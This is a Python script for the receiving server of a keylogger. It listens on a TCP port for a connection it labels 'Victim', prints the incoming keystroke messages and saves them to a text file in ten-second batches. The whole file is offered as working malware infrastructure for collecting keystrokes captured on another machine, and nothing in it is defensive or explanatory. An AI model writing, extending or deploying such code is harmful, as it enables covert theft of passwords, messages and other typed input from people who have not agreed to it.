import socket
import time
import pyautogui

time_counter = time.time()
file = open("keystrokes_server.txt","w")
c = None #Client socket1
addr = None #Client address1

server_socket1 = socket.socket() #by default it is SOCK_STREAM (TCP) and has porotocal AF_INET (IPv4) 

server_socket1.bind(('192.168.0.102',9999)) #server machine's ip and port on which it will send and recieve connections from

server_socket1.listen(2) #We will only accept two connections as of now , one for each client
print("Server started successfully!!!")
print("Waiting for connections...\n\n")

if((c is None) and (addr is None)):
		c,addr = server_socket1.accept()
		print("Victim connected with IP ",addr," !!")


messages = []
while True:
    current_time = time.time() - time_counter
    
    msg = c.recv(4096)
    if(msg!=None):
        msg = msg.decode()
        if msg == "Connection closed by the client!!":
            print(msg)
            server_socket1.shutdown(socket.SHUT_RDWR)
            for i in messages:
                file.write(i)
                file.write("\n")
            break
        print(msg)
        messages.append(msg)
        
    text = "\n\n\n ******Data for span "+str(int(current_time))+" seconds to "+str(int(current_time+10))+" seconds ********"
    if(int(current_time)%10==0):
        new_current_time = time.time() - time_counter
        for i in messages:
            file.write(i)
        messages = []
        file.close()
        file = open("keystrokes_server.txt","a")  
        if(current_time<new_current_time ):
            file.write(text)
            file.write("\n")
        for i in messages:
            file.write(i)
        messages = []